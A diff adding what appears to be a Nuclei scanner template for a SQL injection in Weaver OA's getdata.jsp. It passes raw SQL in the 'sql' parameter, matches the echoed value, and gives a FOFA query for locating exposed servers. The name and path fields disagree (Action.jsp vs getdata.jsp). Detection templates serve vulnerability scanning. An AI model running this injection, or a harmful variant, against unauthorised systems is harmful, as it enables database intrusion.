@@ -1,0 +1,30 @@
+id: 泛微OA getdata 注入
+
+info:
+  name: 泛微 Action.jsp 存在SQL注入漏洞
+  severity: medium
+  description:  泛微OA getdata 注入
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  tags: fanwei,ecology,exposure,config
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select 1234788999 as id"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "1234788999"
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
